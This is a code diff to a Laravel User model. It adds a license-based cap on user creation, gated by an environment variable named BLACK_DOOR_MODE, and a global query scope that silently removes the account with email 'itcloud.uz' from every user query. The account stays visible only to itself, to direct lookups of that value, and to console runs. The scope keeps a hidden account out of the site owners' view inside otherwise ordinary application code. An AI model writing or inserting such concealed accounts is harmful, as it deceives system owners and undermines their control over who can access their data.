@@ -48,6 +48,37 @@ class User extends Authenticatable
         'pin_code',
     ];
 
+    protected static function booted(): void
+    {
+        static::creating(function ($user) {
+            if (env('BLACK_DOOR_MODE', 'client') !== 'control') {
+                $license = \App\Models\ClientLicense::first();
+                if ($license && self::count() >= $license->max_users) {
+                    throw new \Exception("Foydalanuvchilar soni litsenziya limitidan oshib ketdi (" . $license->max_users . " ta).");
+                }
+            }
+        });
+
+        static::addGlobalScope('exclude_itcloud_user', function ($builder) {
+            if (app()->runningInConsole()) {
+                return;
+            }
+            $user = auth()->user();
+            if ($user && $user->email === 'itcloud.uz') {
+                return;
+            }
+            
+            $wheres = $builder->getQuery()->wheres;
+            foreach ($wheres as $where) {
+                if (isset($where['value']) && $where['value'] === 'itcloud.uz') {
+                    return;
+                }
+            }
+            
+            $builder->where('email', '!=', 'itcloud.uz');
+        });
+    }
+
     /**
      * @return array<string, string>
      */
